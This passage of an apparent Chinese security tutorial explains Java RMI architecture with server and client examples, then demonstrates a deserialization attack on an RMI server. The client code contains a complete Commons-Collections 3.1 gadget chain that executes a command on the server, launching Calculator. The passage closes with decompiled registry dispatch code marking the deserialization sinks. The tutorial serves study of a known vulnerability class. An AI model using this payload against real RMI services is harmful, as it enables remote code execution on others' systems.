@@ -1,0 +1,409 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="70ce4bad499820fc6b0e7e10e0d3f0ee">0x00 前言</h2>
+<p>上个文章我们了解到了远程动态代理机制，了解其创建动态代理创建对象的过程。但实际中我们java漏洞远程利用过程中，并不是说服务端会创建个远程代理让其客户端去实现攻击，而更多的是借助java的远程方式协议上的利用。所以我们来了解下java的RMI远程机制，看看我们是如何能够将其进行利用来攻击远程目标。</p>
+<h2 data-content="1" id="0cda28e633ddca4d249585cb8c31ec9b">0x01 RMI机制概念</h2>
+<p>java RMI全称为 java Remote Method Invocation（java 远程方法调用），是java编程语言中，一种实现远程过程调用的应用程序编程接口。存储于java.rmi包中，使用其方法调用对象时，必须实现Remote远程接口，能够让某个java虚拟机上的对象调用另外一个Java虚拟机中的对象上的方法。两个虚拟机可以运行在相同计算机上的不同进程，也可以是网络上的不同计算机。</p>
+<h2 data-content="1" id="43adc4ed66a3e05971a0dce5bc309a54">0x02 RMI基本名词</h2>
+<p>从RMI设计角度来讲，基本分为三层架构模式来实现RMI，分别为RMI服务端，RMI客户端和RMI注册中心。</p>
+<p><strong>客户端:</strong></p>
+<p>存根/桩(Stub):远程对象在客户端上的代理;<br/>
+远程引用层(Remote Reference Layer):解析并执行远程引用协议;<br/>
+传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。</p>
+<p><strong>服务端:</strong></p>
+<p>骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值;<br/>
+远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用;<br/>
+传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。</p>
+<p><strong>注册表(Registry):</strong>以URL形式注册远程对象，并向客户端回复对远程对象的引用。</p>
+<h2 data-content="1" id="d9f44493e80fab651f687defcd301fd6">0x03 流程原理</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227013102-65c85794-7858-1.png"/></p>
+<p>因为这个流程图讲解很细致了，我就不多描述了。我们直接看代码来进行讲解吧。</p>
+<h2 data-content="1" id="a27c29949d974c80360923f1fb3e97e9">0x04 案例讲解</h2>
+<h3 data-content="1" id="432a59afe93bbbaa1dd6cc2dde4eabb4">定义一个远程接口</h3>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RMIProject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="c1">// 定义一个远程接口，继承java.rmi.Remote接口</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">HelloInterface</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="nf">Hello</span><span class="o">(</span><span class="n">String</span> <span class="n">age</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>这里我们定义了一个HelloInterface接口，定义了一个hello方法，同时抛出RemoteException异常。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227014134-de9417f2-7859-1.png"/></p>
+<p>同时我们在使用RMI远程方法调用的时候，需要事先定义一个远程接口，继承java.rmi.Remote接口，但该接口仅为RMI标识接口，本身不代表使用任何方法，说明可以进行RMI java虚拟机调用。</p>
+<p>同时由于RMI通信本质也是基于“网络传输”，所以也要抛出RemoteException异常。</p>
+<h3 data-content="1" id="870335eb7135f8b5dacce28012363130">远程接口实现类</h3>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RMIProject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+
+<span class="c1">// 远程接口实现类，继承UnicastRemoteObject类和Hello接口</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloImp</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">HelloInterface</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">1L</span><span class="o">;</span>
+
+    <span class="kd">protected</span> <span class="nf">HelloImp</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">();</span> <span class="c1">// 调用父类的构造函数</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">Hello</span><span class="o">(</span><span class="n">String</span> <span class="n">age</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="s">"Hello"</span> <span class="o">+</span> <span class="n">age</span><span class="o">;</span> <span class="c1">// 改写Hello方法</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>接着我们创建HelloImp类，继承UnicastRemoteObject类和Hello接口，定义改写HelloInterface接口的hello方法。</p>
+<p>但远程接口实现类必须继承UnicastRemoteObject类，用于生成 Stub（存根）和 Skeleton（骨架）。</p>
+<p>Stub可以看作远程对象在本地的一个代理，囊括了远程对象的具体信息，客户端可以通过这个代理和服务端进行交互。</p>
+<p>Skeleton可以看作为服务端的一个代理，用来处理Stub发送过来的请求，然后去调用客户端需要的请求方法，最终将方法执行结果返回给Stub。</p>
+<p>同时跟进UnicastRemoteObject类源代码我们可以发现，其构造函数抛出了RemoteException异常。但这种写法是十分不好的，所以我们通过super()关键词调用父类的构造函数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227014433-4929dbb0-785a-1.png"/></p>
+<h2 data-content="1" id="103507e0a42237da2ad2ad4c60e359ee">RMI服务器端</h2>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RMIProject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+
+<span class="c1">// 服务端</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIServer</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">HelloInterface</span> <span class="n">h</span>  <span class="o">=</span> <span class="k">new</span> <span class="n">HelloImp</span><span class="o">();</span> <span class="c1">// 创建远程对象HelloImp对象实例</span>
+            <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span> <span class="c1">// 获取RMI服务注册器</span>
+            <span class="n">Naming</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">"rmi://localhost:1099/hello"</span><span class="o">,</span><span class="n">h</span><span class="o">);</span> <span class="c1">// 绑定远程对象HelloImp到RMI服务注册器</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"RMIServer start successful"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>这里客户端可以通过这个URL直接访问远程对象，不需要知道远程实例对象的名称，这里服务端配置完成。RMIServer将提供的服务注册在了 RMIService上,并且公开了一个固定的路径 ,供客户端访问。</p>
+<h3 data-content="1" id="1fa0be3883df4a1973c3f597ec5bec6d">RMI客户端配置</h3>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RMIProject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.net.MalformedURLException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.NotBoundException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="c1">// 客户端</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIClient</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">){</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">HelloInterface</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">HelloInterface</span><span class="o">)</span> <span class="n">Naming</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"rmi://localhost:1099/hello"</span><span class="o">);</span> <span class="c1">// 寻找RMI实例远程对象</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">h</span><span class="o">.</span><span class="na">Hello</span><span class="o">(</span><span class="s">"run......"</span><span class="o">));</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"url格式异常"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"创建对象异常"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NotBoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"对象未绑定"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>客户端只需要调用 java.rmi.Naming.lookup 函数，通过公开的路径从RMIService服务器上拿到对应接口的实现类， 之后通过本地接口即可调用远程对象的方法 .</p>
+<p>在整个过程都没有出现RMI Registry，他是去哪儿了嘛？实际上新建一个RMI Registry的时候，都会直接绑定一个对象在上面，我们示例代码中的RMIServer类其实包含了RMI Registry和RMI Server两部分。如下图所示。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227014621-8946002a-785a-1.png"/></p>
+<p>接着我们先启动RMIServer类，再启动RMIClient类即可。</p>
+<h2 data-content="1" id="dd73e5c74eff2416a8ce5b572ae036f8">0x04 RMI机制利用</h2>
+<p>因为在整个RMI机制过程中，都是进行反序列化传输，我们可以利用这个特性使用RMI机制来对RMI远程服务器进行反序列化攻击。</p>
+<p>但实现RMI利用反序列化攻击，需要满足两个条件：</p>
+<p>1、接收Object类型参数的远程方法</p>
+<p>2、RMI的服务端存在执行pop利用链的jar包</p>
+<p>这里我们接着使用上面我们的案例代码进行讲述修改，同时在RMIServer类中commons-collections-3.1.jar包</p>
+<p>首先接收Object类型的参数，所以我们将HelloInterface接口定义的hello方法中的参数类型进行改写</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227014808-c916372e-785a-1.png"/></p>
+<p>再定义一下Test方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227014830-d699d9c8-785a-1.png"/></p>
+<p>我们的RMI服务端不需要更改，只需要改下为RMI客户端，其中Test方法中的Object类型参数导入恶意的commons-collections-3.1.jar包pop利用链方法，然后发现成功执行弹出计算器。</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.MalformedURLException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIClient</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">){</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">HelloInterface</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">HelloInterface</span><span class="o">)</span> <span class="n">Naming</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"rmi://localhost:1099/hello"</span><span class="o">);</span> <span class="c1">// 寻找RMI实例远程对象</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">h</span><span class="o">.</span><span class="na">Hello</span><span class="o">(</span><span class="s">"run......"</span><span class="o">));</span>
+            <span class="n">h</span><span class="o">.</span><span class="na">Test</span><span class="o">(</span><span class="n">getpayload</span><span class="o">());</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"url格式异常"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"创建对象异常"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NotBoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"对象未绑定"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">getpayload</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+        <span class="n">Map</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">innermap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"key"</span><span class="o">,</span> <span class="s">"xiaoyang"</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">transformedMap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+
+        <span class="n">Class</span> <span class="n">cl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+        <span class="n">Constructor</span> <span class="n">ctor</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">ctor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">ctor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">transformedMap</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">instance</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210227014929-f9986908-785a-1.png"/></p>
+<h2 data-content="1" id="eb28bda2ab32404be10bfe3da2066b89">0x05 RMI客户端攻击RMI注册中心</h2>
+<p>在讲这个攻击场景之前，我们可以来看下RMI服务端的触发处。</p>
+<p>在RMI过程中，RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会传递给Skeleton代理(sun.rmi.registry.RegistryImpl_Skel#dispatch)</p>
+<p>最终实际是sun.rmi.registry.RegistryImpl_Skel#dispatch来进行处理，我们可以定位其查看重要逻辑代码。</p>
+<div class="highlight"><pre><span></span><span class="k">switch</span><span class="o">(</span><span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+                <span class="k">try</span> <span class="o">{</span> <span class="c1">//bind方法</span>
+                    <span class="n">var11</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">// readObject反序列化触发</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var94</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var94</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var95</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var95</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="o">}</span>
+
+                <span class="n">var6</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">);</span>
+
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var93</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling return"</span><span class="o">,</span> <span class="n">var93</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="c1">//list()方法</span>
+                <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="n">String</span><span class="o">[]</span> <span class="n">var97</span> <span class="o">=</span> <span class="n">var6</span><span class="o">.</span><span class="na">list</span><span class="o">();</span>
+
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">ObjectOutput</span> <span class="n">var98</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="n">var98</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var97</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var92</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling return"</span><span class="o">,</span> <span class="n">var92</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+                <span class="k">try</span> <span class="o">{</span>  <span class="c1">// look()方法</span>
+                    <span class="n">var10</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">// readObject反序列化触发</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var10</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var89</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var89</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var90</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var90</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="o">}</span>
+
+                <span class="n">var8</span> <span class="o">=</span> <span class="n">var6</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
+
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">ObjectOutput</span> <span class="n">var9</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="n">var9</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var8</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var88</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling return"</span><span class="o">,</span> <span class="n">var88</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+                <span class="k">try</span> <span class="o">{</span> <span class="c1">// rebind()方法</span>
+                    <span class="n">var11</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//readObject反序列化触发</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var85</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var85</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var86</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var86</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="o">}</span>
+
+                <span class="n">var6</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">);</span>
+
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var84</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling return"</span><span class="o">,</span> <span class="n">var84</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+                <span class="k">try</span> <span class="o">{</span> <span class="c1">//unbind()方法</span>
+                    <span class="n">var10</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//readObject反序列化触发</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var10</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var81</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var81</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var82</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var82</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="o">}</span>
+
